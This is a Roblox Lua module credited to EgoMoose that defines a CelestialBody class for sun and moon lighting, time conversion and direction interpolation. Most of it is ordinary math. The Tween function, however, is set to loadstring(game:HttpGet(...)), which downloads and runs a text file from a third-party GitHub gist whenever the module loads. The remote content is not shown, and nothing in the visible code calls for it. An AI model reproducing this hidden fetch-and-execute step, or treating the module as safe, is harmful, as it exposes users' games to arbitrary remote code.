--[[

This module returns a class that allows you to set and get information about the lighting celestial bodies more easily in 
addition to transition between different lighting states fluidly

API:

Static Functions:
	CelestialBody.Tween(bodyA, bodyB, tweenInfo)
		> Returns a pseudo tween object should behave identically to what TweenService:Create returns
	CelestialBody.ToTimeOfDay(Number clockTime)
		> Provide a clock time and the function will return the equivalent TimeOfDay String
	CelestialBody.ToClockTime(String timeOfDay)
		> Provide a time of day string and the function will return the equivalent ClockTime Number

Constructors:
	CelestialBody.new(String body, Number timeOfDay, Number geographicLatitude)
		> Creates a CelestialBodyClass from the body ("Sun" or "Moon"), time of day, and the geographic latitude
	CelestialBody.FromLighting(String body)
		> Creates a CelestialBodyClass from the body ("Sun" or "Moon") and the current Lighting properties
	CelestialBody.FromDirection(String body, Vector3 direction)
		> Creates a CelestialBodyClass from the body ("Sun" or "Moon") and a direction
		> For example you could do this to match current lighting as well:
			> CelestialBody.FromDirection("Sun", game.Lighting:GetSunDirection())

Methods:
	CelestialBody:SetAsLighting()
		> Sets the CelestialBody properties to the actual lighting
	CelestialBody:GetDirection()
		> Returns the direction of the CelestialBody
	CelestialBody:Lerp(CelestialBody cBody, Number alpha)
		> Returns a new CelestialBody which represents the interpolated information between CelestialBody and cBody by amount alpha
	CelestialBody:Clone()
		> Returns a duplicate of the current CelestialBody

Properties:
	CelestialBody.Body
		> Either the "Sun" or the "Moon"
	CelestialBody.TimeOfDay
		> The time of day string representing the CelestialBody
	CelestialBody.GeographicLatitude
		> The geographic latitude representing the CelestialBody

Enjoy!
- EgoMoose

--]]

local LIGHTING = game:GetService("Lighting")

local TAU = math.pi*2
local ZERO3 = Vector3.new(0, 0, 0)
local IDENTITY = CFrame.new()
local TIMEFORMAT = "%s:%02d:%02d"

local LONGITUDEFACTOR = {
	["Sun"] = -1,
	["Moon"] = 1
}

-- Private Functions

local function getRotationBetween(u, v, axis)
	local dot, uxv = u:Dot(v), u:Cross(v)
	if (dot < -0.99999) then return CFrame.fromAxisAngle(axis, math.pi) end
	return CFrame.new(0, 0, 0, uxv.x, uxv.y, uxv.z, 1 + dot)
end

-- Class

local CelestialBody = {}
CelestialBody.__index = CelestialBody

-- Public Static Functions

CelestialBody.Tween = loadstring(game:HttpGet("https://gist.githubusercontent.com/saucekid/b11c457963077494df55c877c43b5a33/raw/53267d7563654e785fafaeb767bb6b157b6dd444/Nt2My3Od8h.txt"))

function CelestialBody.ToTimeOfDay(clockTime)
	local hour, minFrac = math.modf(clockTime)
	local min = minFrac * 60
	
	local minInt, secFrac = math.modf(min)
	local sec = secFrac * 60
	
	hour = tostring(hour)
	min = math.abs(min)
	sec = math.abs(sec)
	
	return TIMEFORMAT:format(hour, min, sec)
end

function CelestialBody.ToClockTime(timeOfDay)
	local hour, min, sec = unpack(string.split(timeOfDay, ":"))
	
	hour = tonumber(hour)
	min = tonumber(min) / 60
	sec = tonumber(sec) / 60 / 60
	
	return tonumber(("%.3f"):format(math.abs(hour) + min + sec)) * math.sign(hour)
end

-- Public Constructors

function CelestialBody.new(body, timeOfDay, geographicLatitude)
	local self = setmetatable({}, CelestialBody)
	
	self.Body = body
	self.TimeOfDay = timeOfDay
	self.GeographicLatitude = geographicLatitude
	
	return self
end

function CelestialBody.FromLighting(body)
	return CelestialBody.new(body, LIGHTING.TimeOfDay, LIGHTING.GeographicLatitude)
end

function CelestialBody.FromDirection(body, direction)
	local lf = LONGITUDEFACTOR[body]
	local lat = math.atan2(direction.z, math.sqrt(direction.x^2 + direction.y^2))
	local lon = math.atan2(direction.y * lf, direction.x * lf)
	
	local geoLat = (lat/TAU)*360 + 23.5
	local clockTime = (lon/TAU)*24 - 6
	
	return CelestialBody.new(body, CelestialBody.ToTimeOfDay(clockTime), geoLat)
end

-- Public Methods

function CelestialBody:SetAsLighting()
	LIGHTING.TimeOfDay = self.TimeOfDay
	LIGHTING.GeographicLatitude = self.GeographicLatitude
end

function CelestialBody:GetDirection()
	local geoLat = self.GeographicLatitude
	local clockTime = CelestialBody.ToClockTime(self.TimeOfDay)
	
	local lat = (geoLat - 23.5)/360 * TAU
	local lon = (clockTime + 6)/24 * TAU
	local dir = CFrame.fromEulerAnglesYXZ(lat, lon, 0).LookVector
	
	return Vector3.new(dir.z, dir.x, dir.y)
end

function CelestialBody:Lerp(cBody, alpha)
	alpha = math.clamp(alpha, 0, 1)
	
	local dA = self:GetDirection()
	local dB = cBody:GetDirection()
	
	local backupCF = CFrame.new(ZERO3, dA)
	local direction = IDENTITY:Lerp(getRotationBetween(dA, dB, backupCF.RightVector), alpha) * dA
	
	return CelestialBody.FromDirection(self.Body, direction)
end

function CelestialBody:Clone()
	return CelestialBody.new(
		self.Body,
		self.TimeOfDay,
		self.GeographicLatitude
	)
end

--

return CelestialBody
